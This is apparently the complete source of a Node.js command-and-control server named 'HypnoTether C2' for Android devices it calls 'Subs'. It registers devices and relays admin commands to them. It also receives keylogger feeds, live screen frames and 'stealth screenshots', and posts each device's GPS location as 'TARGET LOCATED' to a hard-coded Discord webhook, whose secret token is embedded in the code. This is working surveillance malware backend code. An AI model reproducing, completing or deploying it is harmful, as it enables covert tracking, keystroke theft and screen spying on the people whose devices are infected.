const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    pingInterval: 10000,
    pingTimeout: 5000,
    cors: { origin: '*' }
});

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use(express.json());

// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)){
    fs.mkdirSync(uploadDir);
}

// Multer Storage Configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

// Tracking Connected Devices
// In-memory data structure: { socketId: { id: "Sub-A3B9", os: "Android", lastSeen: timestamp } }
const connectedDevices = {};

// File Upload Endpoint
app.post('/api/upload', upload.single('media'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
    const fileUrl = `https://${req.get('host')}/uploads/${req.file.filename}`;
    res.json({ success: true, url: fileUrl, type: req.file.mimetype });
});

// Socket.IO Communication
io.on('connection', (socket) => {
    console.log(`[C2] New Connection: ${socket.id}`);

    // Device Handshake (Client announces itself)
    socket.on('register_device', (data) => {
        connectedDevices[socket.id] = {
            socketId: socket.id,
            id: data.deviceId || `Sub-${socket.id.substring(0, 4).toUpperCase()}`,
            model: data.model || 'Unknown Android',
            connectedAt: new Date()
        };
        console.log(`[C2] Device Registered: ${connectedDevices[socket.id].id}`);
        // Broadcast updated device list to Admins (Dashboard)
        io.emit('device_list_update', Object.values(connectedDevices));
    });

    // Admin identifying as dashboard
    socket.on('admin_join', () => {
        socket.join('admins');
        socket.emit('device_list_update', Object.values(connectedDevices));
    });

    // Relay commands from Admin to specific Device
    socket.on('send_command', (data) => {
        // data: { target: socketId, command: "vibrate", payload: {...} }
        const { target, command, payload } = data;
        if (target && target !== 'all') {
            io.to(target).emit(command, payload);
            console.log(`[C2] Sent '${command}' to ${target}`);
        } else {
            // Broadcast to everyone except admins
            socket.broadcast.emit(command, payload);
             console.log(`[C2] Sent '${command}' to everyone`);
        }
    });

    // Relay location data back to admins and Discord Webhook
    socket.on('location_update', async (data) => {
        io.to('admins').emit('location_result', data);
        
        // Push payload to Discord Webhook
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8"; 
        if (!data.error) {
            try {
                // Find device ID for context
                const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
                
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**TARGET LOCATED:** ${subId}\n**GPS Map Link:** ${data.mapUrl}`
                    })
                });
            } catch (err) {
                console.error("[C2] Failed to post GPS to Discord:", err.message);
            }
        }
    });

    // Relay keylogger feed back to admins
    socket.on('keylog_event', (data) => {
        io.to('admins').emit('keylog_feed', data);
    });
    
    // Relay chat from Sub back to Admin
    socket.on('chat_reply', (data) => {
        // Find sender
        const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
        io.to('admins').emit('chat_reply', { from: subId, text: data.text });
    });

    // Relay screen stream from Sub to Admin
    socket.on('screen_frame', (data) => {
        io.to('admins').emit('screen_frame', data);
    });

    // Relay stealth screenshots from Sub to Admin
    socket.on('incoming_screenshot', (data) => {
        io.to('admins').emit('incoming_screenshot', data);
    });

    socket.on('disconnect', () => {
        console.log(`[C2] Disconnected: ${socket.id}`);
        if (connectedDevices[socket.id]) {
            delete connectedDevices[socket.id];
            io.emit('device_list_update', Object.values(connectedDevices));
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[HypnoTether C2] Server running on port ${PORT}`);
});
